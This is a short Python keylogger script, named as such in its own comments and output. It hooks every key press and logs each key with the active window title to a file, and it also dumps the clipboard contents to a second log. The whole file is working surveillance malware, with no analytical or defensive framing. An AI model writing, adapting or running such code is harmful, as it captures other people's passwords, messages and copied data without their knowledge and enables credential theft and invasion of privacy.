import keyboard
import logging
import pyperclip
import win32gui
from datetime import datetime

# Set up logging
log_dir = ""

# Logging keystrokes
logging.basicConfig(filename=(log_dir + "keystrokes.log"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to get the current active window title
def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        return window_title
    except Exception as e:
        print(f"Error getting active window title: {e}")
        return ""

# Function to log clipboard content
def log_clipboard():
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            with open(log_dir + "clipboard.log", "a") as file:
                file.write(f"{datetime.now()}: {clipboard_content}\n")
    except Exception as e:
        print(f"Clipboard logging error: {e}")

# Function to log keystrokes with active window
def on_key_event(event):
    try:
        window_title = get_active_window()
        log_clipboard()
        logging.info(f"{window_title}: {event.name}")
    except Exception as e:
        print(f"Error logging keystroke: {e}")

# Register the event listener
keyboard.on_press(on_key_event)

# Main function to start the keylogger
def main():
    print("Keylogger is running... Press ESC to stop.")
    keyboard.wait('esc')  # Stop the keylogger when 'ESC' key is pressed

if __name__ == "__main__":
    main()
